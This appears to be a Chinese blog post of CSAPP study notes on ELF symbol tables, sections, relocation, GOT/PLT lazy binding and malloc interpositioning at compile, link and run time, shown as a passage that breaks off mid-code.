<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf32_Word    st_name;      <span class="comment">/* 符号对应字符串在strtab节中的偏移量 */</span> </span><br><span class="line">        Elf32_Word    st_value;     <span class="comment">/* 在对应节中的偏移量，可执行文件中是虚拟地址 */</span></span><br><span class="line">        Elf32_Word    st_size;      <span class="comment">/* 符号对应目标所占字节数 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   type: <span class="number">4</span>,    <span class="comment">/* 符号对应目标的类型：数据、函数、源文件、节 */</span></span><br><span class="line">              		 binding: <span class="number">4</span>;    <span class="comment">/* 符号类别：全局符号、局部符号、弱符号 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_other;</span><br><span class="line">        Elf32_Section   st_shndx;    <span class="comment">/* 符号对应目标所在的节，或其他情况 */</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">    Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span>  </span><br><span class="line">    <span class="comment">// 高4字节为type，低4字节为binding</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span>  </span><br><span class="line">    Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span>  </span><br><span class="line">    Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span>  </span><br><span class="line">&#125;Elf64_Sym; </span><br></pre></td></tr></table></figure>
<p>st_name：对应字符串表的偏移</p>
<p>st_value：距离目标符号地址的偏移</p>
<p>st_size：目标的大小</p>
<p>st_info：高字节为type，低字节为binding</p>
<p>type：表示符号类型（要么是数据，要么是函数）</p>
<p>binding：表示符号是本地的，还是全局的</p>
<p><strong>符号和节</strong></p>
<p>每个符号都会被分配到目标文件的某个节，由 section 字段表示，改字段也是一个到节头部表的<strong>索引</strong>，但是存在3个 <strong>伪节</strong> ，它们在节头部表中是没有条目的</p>
<p>ABS：代表不应该被重定位的符号</p>
<p>UNDEF：代表未定义的符号，就是在本目标模块中被引用，但是却在其他地方定义的符号</p>
<p>COMMON：代表未被分配位置的未初始化数据的目录</p>
<p>​        // 只有在可重定位目标文件中才有这些伪节，可执行目标文件是没有的</p>
<p>COMMON和bss节的区别很细微：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641286551347-1646286364493-1646808754596-1646808862602.png" class width="1641286551347"> 
<p><strong>符号解析</strong></p>
<p>链接器从左往右按照它们在编译器驱动程序命令行上出现的顺序，来扫描可重定位目标文件和存档文件，在这次扫描中，链接器会维护：</p>
<p>一个 <strong>可重定位目标文件的集合E</strong> （将会被合并为可执行目标文件）</p>
<p>一个 <strong>未解析符号集合U</strong> （引用了但是未定义）</p>
<p>一个 <strong>在前面输入文件中已经定义的符号集合D</strong>（自己定义的符号也会被装入）</p>
<p>符号解析的工作流程如下：</p>
<ol>
<li>在命令行上输入文件F，链接器会判断文件F是一个目标文件，还是一个存档文件 </li>
<li>如果是目标文件，则添加到E，并且修改U和D来反应F中的 <strong>符号定义</strong> 和 <strong>引用</strong></li>
<li>如果F是一个存档文件，那么链接会尝试匹配 <strong>未解析符号集合U</strong> 和 <strong>存档文件成员定义的符号</strong> ，假设存档文件中有个成员 m，定义了一个符号来解析U中的一个引用，那么就将 m 添加到E中，并且链接器修改U和D来反映 m 中的 <strong>符号定义</strong> 和 <strong>引用</strong></li>
</ol>
<p>扫描完成以后，集合U非空，链接器就会输出一个错误并终止，以表明有符号未定义</p>
<p>扫描完成以后，集合U为空，那么链接器就会合并集合E中的目标文件，构建可执行文件</p>
<p>​        // 当D被新填入时，对应的U会减少</p>
<p><strong>符号变量</strong></p>
<p>自动变量（动态局部变量）：auto </p>
<ul>
<li>离开函数，值就消失</li>
<li>不写 static 就默认是 auto</li>
</ul>
<p>静态局部变量：static </p>
<ul>
<li>离开函数，值任然保留</li>
<li>变量的值只在函数内部生效</li>
<li>带有 static 的变量只会初始化一次（数据存储在 data 段）</li>
<li>当上一级函数多次调用本函数时，带有 static 的变量数值不变（并且不会进行初始化）</li>
</ul>
<p>寄存器变量：register</p>
<ul>
<li>离开函数，值就消失</li>
<li>变量的值只在函数内部生效</li>
</ul>
<p>全局变量：在 main 之外</p>
<ul>
<li>允许 main 中所有函数访问</li>
<li>允许外部其他文件访问</li>
</ul>
<p>静态全局变量：在 main 之外，static</p>
<ul>
<li>允许 main 中所有函数访问</li>
<li>变量的值只在文件内部生效</li>
</ul>
<h2 id="节"><a href="#节" class="headerlink" title="节"></a>节</h2><p>使用目标文件的节头表，可以定位文件的所有节，节头表是 <code>Elf32_Shdr</code> 或 <code>Elf64_Shdr</code> 结构的数组</p>
<p><strong>节头</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        elf32_Word      sh_name; <span class="comment">/* 节的名称，此成员值是节头字符串表节的索引，用于指定以空字符结尾的字符串的位置 */</span></span><br><span class="line">        Elf32_Word      sh_type; <span class="comment">/* 用于将节的内容和语义分类 */</span></span><br><span class="line">        Elf32_Word      sh_flags; <span class="comment">/* 节可支持用于说明杂项属性的1位标志 */</span></span><br><span class="line">        Elf32_Addr      sh_addr; <span class="comment">/* 如果节显示在进程的内存映像中，则此成员会指定节的第一个字节所在的地址 */</span></span><br><span class="line">        Elf32_Off       sh_offset; <span class="comment">/* 从文件的起始位置到节中第一个字节的字节偏移 */</span></span><br><span class="line">        Elf32_Word      sh_size; <span class="comment">/* 节的大小 */</span></span><br><span class="line">        Elf32_Word      sh_link; <span class="comment">/* 节头表索引链接，其解释依赖于节类型 */</span></span><br><span class="line">        Elf32_Word      sh_info; <span class="comment">/* 额外信息，其解释依赖于节类型 */</span></span><br><span class="line">        Elf32_Word      sh_addralign; <span class="comment">/* 一些节具有地址对齐约束 */</span></span><br><span class="line">        Elf32_Word      sh_entsize; <span class="comment">/* 指定每一项的大小(一些节包含固定大小的项的表) */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf64_Word      sh_name;</span><br><span class="line">        Elf64_Word      sh_type;</span><br><span class="line">        Elf64_Xword     sh_flags;</span><br><span class="line">        Elf64_Addr      sh_addr;</span><br><span class="line">        Elf64_Off       sh_offset;</span><br><span class="line">        Elf64_Xword     sh_size;</span><br><span class="line">        Elf64_Word      sh_link;</span><br><span class="line">        Elf64_Word      sh_info;</span><br><span class="line">        Elf64_Xword     sh_addralign;</span><br><span class="line">        Elf64_Xword     sh_entsize;</span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<p><strong>节分配</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646800862254-1646808754596-1646808862602.png" class width="1646800862254"> 
<p><strong>节简述</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646800924153-1646808754597-1646808862602.png" class width="1646800924153"> 
<ul>
<li>ELF头：包括16字节的标识信息，文件类型（.o，exec，.so），机器类型（如Intel 80386），节头表的偏移，节头表的表项大小及表项个数 </li>
<li>.text节：编译后的代码部分 </li>
<li>.rodata节：只读数据，如 printf 用到的格式串，switch 跳转表等</li>
<li>.data节：已初始化的全局变量和静态变量</li>
<li>.bss节：未初始化全局变量和静态变量，仅是占位符，不占据任何磁盘空间，区分初始化和非初始化是为了空间效率</li>
<li>.symtab节：存放函数和全局变量（符号表）的信息，它不包括局部变量</li>
<li>.rel.text节：.text节的重定位信息，用于重新修改代码段的指令中的地址信息</li>
<li>.debug节：调试用的符号表（gcc -g） </li>
<li>.strtab节：包含 .symtab节和 .debug节 中的符号及节名 </li>
</ul>
<p><strong>示例</strong>（可能会有不同，比如：在我的电脑上 .data 为第4节）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646632648612-1646808754597-1646808862602.png" class width="1646632648612"> 
<h2 id="运行-amp-链接-amp-加载-amp-存储地址"><a href="#运行-amp-链接-amp-加载-amp-存储地址" class="headerlink" title="运行&amp;链接&amp;加载&amp;存储地址"></a>运行&amp;链接&amp;加载&amp;存储地址</h2><p><strong>运行地址 ~~ 链接地址</strong></p>
<p>链接地址：在程序编译的时候，每个目标文件都是由源代码编译得到，最终多个目标文件链接生成一个最终的可执行文件，而链接地址就是指示链接器，各个目标文件的在可执行程序中的位置 </p>
<ul>
<li>链接地址是静态的，在进行程序编译的时候指定的</li>
</ul>
<p>运行地址： 程序实际在内存中运行时候的地址 </p>
<ul>
<li>运行地址是动态的，如果你将程序加载到内存中时，改变存放在内存的地址，那么运行地址也就随之改变了</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641356351200-1646286364493-1646808754597-1646808862602.png" class width="1641356351200"> 
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如上图所示，指令ldr r0, =func就是一条位置相关指令，在编译的时候，编译器根据链接地址（链接地址入口是 <span class="number">0x40008000</span> ）将其翻译成：ldr r0, [pc, #<span class="number">0x80</span>]，也就是将func标号等价于地址 <span class="number">0x40008080</span> ，然后将 <span class="number">0x40008080</span> 这个地址数值放在a.out文件中链接地址 <span class="number">0x50008000</span> 的位置。当程序运行时，a.out会被加载到内存中运行，如果程序运行的地址和链接的地址都是 <span class="number">0x40008000</span> ，那么程序运行时，没有任何问题，因为读取的func的地址是 <span class="number">0x40008080</span> ，实际跳转的时候，跳转到 <span class="number">0x40008080</span> 中存放的也是func对应的代码。但是如果运行的地址和链接地址不一样（运行地址是 <span class="number">0x20008000</span> ），这时候，func的地址还是编译的时候计算的地址 <span class="number">0x40008080</span> ，但是实际在内存中，func的地址是 <span class="number">0x20008080</span> ，那么当你跳转执行func的时候，取出来的是 <span class="number">0x40008080</span> ，跳转的地址也是 <span class="number">0x40008080</span> ，而 <span class="number">0x40008080</span> 中存放的是什么代码我们不确定，但是一定不是func的代码（func存放在 <span class="number">0x20008080</span> 中）。这个就是位置相关的概念</span><br></pre></td></tr></table></figure>
<p><strong>加载地址 ~~ 存储地址</strong> </p>
<p>加载地址：每一个程序一开始都是存放在flash中的，而运行是在内存中，这个时候就需要从flash中将指令读取到内存中（运行地址），flash的地址就是加载地址 </p>
<p>存储地址：指令在flash中存放的存储地址，就是存储地址 </p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNmianfeixiazai001/article/details/81455692">链接地址、运行地址、加载地址、存储地址</a></p>
<h2 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h2><p>但链接器完成符号解析这一步时，就会把代码中的 <strong>每个符号引用</strong> 和 <strong>一个符号定义</strong> 关联起来</p>
<p>此时，链接器就知道它输入目标模块的 “代码节” 和 “数据节” 的切确大小</p>
<p>重定位的工作流程如下：</p>
<ul>
<li>重定位“节”和“符号定义”：链接器会把所有同类型的节合并起来，然后将“运行地址”赋值给 <strong>“新的聚合节”</strong> ， <strong>“输入模块中定义的每个节”</strong> ，以及 <strong>“输入模块中定义的每个符号”</strong> ，这一步完成之后，程序中的每条指令和全局变量都有唯一的“运行地址” </li>
<li>重定位“节”中的“符号引用”：链接器会修改 代码节 和 数据节 中对应 <strong>每个符号的引用</strong> ，使得它们指向 <strong>正确的运行地址</strong> （链接器需要依赖“重定位条目relocation entry”完成此操作）</li>
</ul>
<h2 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h2><p>代码的重定位条目存放于“.rel.text”中</p>
<p>已初始化数据的重定位条目存放于“.rel.data”中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr  r_offset;</span><br><span class="line">    Elf32_Word  r_info; </span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr  r_offset;	</span><br><span class="line">    Elf64_Word  r_info; 	</span><br><span class="line">    Elf64_Word r_addend;	</span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>r_offset：需要 “被修改引用” 的节偏移</p>
<p>r_info：高字节为type，低字节为symbol</p>
<p>type：告知链接器如何修改新的引用</p>
<p>symbol：标识 “被修改引用” 应该指向的符号</p>
<p>r_addend：一个符号常数，一些类型的重定位要使用它进行调整</p>
<p>ELF文件定义了32种不同的重定位类型，其中最基本的两种为：</p>
<ul>
<li>R_X86_64_PC32：使用32位 <strong>PC相对地址</strong> 的引用（PC相对地址：距离程序计数器（PC）的当前运行值的偏移量），类似于 “jmp xxxx” 等汇编指令，“xxxx” 加上 程序的“SP指针”得到 <strong>有效地址</strong> ，PC值通常是下一条指令在内存中的地址</li>
<li>R_X86_64_32：使用32位 <strong>绝对地址</strong> ，CPU直接获取 <strong>有效地址</strong></li>
</ul>
<p>文件中的代码和数据总体大小“小于2GB”，使用“R_X86_64_PC32”（小型代码模型）</p>
<p>文件中的代码和数据总体大小“大于2GB”，使用“R_X86_64_32”（中型代码模型，大型代码模型）</p>
<p>GCC默认使用“R_X86_64_PC32”</p>
<h2 id="可执行目标文件"><a href="#可执行目标文件" class="headerlink" title="可执行目标文件"></a>可执行目标文件</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/ELF-Walkthrough-1646286364493-1646808754597-1646808862602.png" class title="ELF-Walkthrough"> 
<p><strong>段和节</strong></p>
<p>段视图：是用来描述ELF加载到进程中后，来划分“读，写，执行”权限划分的视图</p>
<p>节视图：是ELF存放在磁盘中时，进行不同功能区域划分的视图</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641626351152-1646286364493-1646808754597-1646808862602.png" class width="1641626351152">
<p>在汇编源码中，通常用语法关键字section或segment来表示一段区域，它们是编译器提供的伪指令，作用是相同的，都是在程序中”逻辑地”规划一段区域，此区域便是节 </p>
<p>注意，此时所说的section或segment都是汇编语法中的关键字，它们在语法中都表示”节”，不是段，只是不同编译器的关键字不同而已，关键字segment在语法中也被认为与section意义相同  </p>
<p>只有ELF文件加载到内存成为进程过后，才有“段”的概念</p>
<p><strong>ELF文件到虚拟内存的映射</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641628962609-1646286364493-1646808754597-1646808862602.png" class width="1641628962609"> 
<p>​        // 左边为“节”，右边为“段”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -s elf	<span class="comment">#查看elf文件结构</span></span><br><span class="line">cat /proc/pid/maps	<span class="comment">#输出进程对应的‘虚拟内存’结构</span></span><br></pre></td></tr></table></figure>
<h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><p>当linux系统加载某个文件时，会通过调用某个驻留在存储器中的 <strong>加载器</strong>（loader）来运行它，加载器本质上也是一段“操作系统代码”（通过execve函数来调用加载器）</p>
<p>加载器把目标文件的“代码”和“数据”，从磁盘复制到内存中的过程就叫做<strong>加载</strong></p>
<h2 id="位置无关代码-PIC"><a href="#位置无关代码-PIC" class="headerlink" title="位置无关代码(PIC)"></a>位置无关代码(PIC)</h2><p>无需“重定位”就可以加装的代码就是 <strong>位置无关代码</strong> （PIC）</p>
<p>位置无关代码无论被加载到哪个地址上都可以正常执行 </p>
<p><strong>PIC的数据引用</strong></p>
<p>无论我们在内存何处加装一个目标模块，它的“数据段”和“代码段”的距离总是保持不变的，因此，代码段中 <strong>任何指令</strong> 和 <strong>任何变量</strong> 之间的距离都是常量</p>
<p>生成全局变量PIC的偏移器利用了这个事实，它在数据段开始的地方创建了一个表，叫做<strong>全局偏移量表</strong>（GOT表），在GOT表中，每个被此模块引用的“全局数据”，“过程”，“全局变量”，都有一个8字节条目</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641723629180-1646286364493-1646808754597-1646808862602.png" class width="1641723629180"> 
<p>加载时，动态链接会重定位GOT表中的每个条目，使其包含目标的绝对地址</p>
<p><strong>PIC的函数调用</strong></p>
<p>编译器没法直接获取“共享库函数”的绝对地址，所以这里采用了<strong>延迟绑定</strong>的方式</p>
<p>延迟绑定技术是通过GOT表（全局偏移量表）和PLT表（过程链接表）的交互完成的</p>
<ul>
<li>过程链接表（plt）：plt是一个数组，每个条目都是16字节的代码，每一个条目负责一个具体的函数，plt[0]是一个特殊条目（它可以跳转 <strong>动态链接器</strong> ），plt[1]调用系统启动函数“libc_start_main”，从plt[2]开始的条目依次调用“用户代码中的函数”</li>
<li>全局偏移量表（got）：got是一个数组，每个条目都是8字节地址，got[0]和got[1]会包含 <strong>动态链接器 </strong>在解析函数地址时需要的信息，got[2]是 <strong>动态链接器</strong> 在“ld-linux.so”模块中的入口点，其余的每一个got表条目都对应一个被调用的函数，每一个条目都有一个对应的plt[n]</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641724561880-1646286364493-1646808754597-1646808862602.png" class width="1641724561880"> 
<ul>
<li>第1步：程序进入plt[n]（对应被调用函数的plt条目），跳转got[n]</li>
<li>第2步：got[n]没有对应的libc地址，程序跳转回plt[n]</li>
<li>第3步：把偏移压栈，接着跳转plt[0]</li>
<li>第4步：把got[1]（link_map）压栈，跳转got[2]</li>
<li>第5步：got[2]中存放的<strong>动态链接器</strong>会根据“偏移”和“got[1]”查找libc库中的函数</li>
<li>第6步：找到对应函数后，进入函数，并且把got[n]对应位置写入libc函数的地址</li>
</ul>
<h2 id="库打桩机制"><a href="#库打桩机制" class="headerlink" title="库打桩机制"></a>库打桩机制</h2><p>linux链接器允许用户截获程序对共享库函数的调用，取而代之自己的代码，这种技术被称为<strong>“库打桩”</strong></p>
<p>利用“库打桩”，用户可以追踪某个函数的调用次数，验证和追踪它的输入值和输出值，或者把它替换为一个完全不同的实现</p>
<p><strong>基本思想</strong></p>
<p>先给定一个需要打桩的目标函数，创建一个包装函数（它的原型和目标函数一样），使用特殊的打桩机制，<strong>可以欺骗程序程序调用包装函数而不是目标函数</strong></p>
<p>假设有程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;malloc.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> malloc(size) mymalloc(size) <span class="comment">//把malloc全替换为mymalloc</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/*打桩函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>编译时打桩：主要利用了C预处理机制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -MYMOCK -c mymalloc.c	</span><br><span class="line">$ gcc -I. -o test test.c mymalloc.o <span class="comment">//test就是目标文件</span></span><br></pre></td></tr></table></figure>
<p>参数 <strong>“- I.”</strong> 会告诉C预处理器，在搜索通常的系统目录之前，先在当前目录中查找“malloc.h”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0xdbd010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：“malloc.h”被“mymalloc.o”调包了</p>
<p><strong>链接时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> malloc(size) mymalloc(size) <span class="comment">//把malloc全替换为mymalloc</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> *__real_malloc(<span class="keyword">size_t</span> size);<span class="comment">//注意声明</span></span><br><span class="line"><span class="comment">/*打桩函数*/</span></span><br><span class="line"><span class="keyword">void</span> *__wrap_malloc(<span class="keyword">size_t</span> size) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr = __real_malloc(size);<span class="comment">//最后会被解析成malloc</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>链接时打桩：linux静态链接器支持用 “—wrap，function”进行打桩 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -DMYMOCK mymalloc.c</span><br><span class="line">$ gcc -c main.c</span><br><span class="line">$ gcc -Wl,--wrap,<span class="built_in">malloc</span> -o test test.o mymalloc.o <span class="comment">//test就是目标文件</span></span><br></pre></td></tr></table></figure>
<p>“-Wl option”表示把“option”传递给链接器</p>
<p>“—wrap，malloc”告诉静态链接器：</p>
<p>把“malloc”解析为“ __wrap_malloc ”</p>
<p>把“ __real_malloc ”解析为“真正的malloc”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0x95f010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：“malloc”被解析为了“ __wrap_malloc ”</p>
<p><strong>运行时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE  <span class="comment">//这行特别注意加上</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> FILE *<span class="built_in">stdout</span>;</span><br><span class="line"><span class="comment">/*打桩的malloc函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> calltimes;</span><br><span class="line">    calltimes++;</span><br><span class="line">    <span class="comment">/*函数指针*/</span></span><br><span class="line">    <span class="keyword">void</span> *(*realMalloc)(<span class="keyword">size_t</span> size) = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *error;</span><br><span class="line"></span><br><span class="line">    realMalloc = dlsym(RTLD_NEXT,<span class="string">&quot;malloc&quot;</span>);<span class="comment">//RTLD_NEXT</span></span><br><span class="line">    <span 